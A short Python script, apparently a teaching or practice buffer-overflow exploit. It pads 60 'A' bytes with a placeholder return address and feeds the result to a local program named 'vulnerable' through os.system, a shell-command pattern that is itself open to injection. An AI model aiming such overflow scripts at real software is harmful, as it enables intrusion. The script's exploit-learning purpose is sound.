import sys
import os

payload = b"A" * 60

return_address = b"\x41\x41\x41\x41"

exploit = payload + return_address

os.system(f'./vulnerable "{exploit.decode("latin-1")}"')
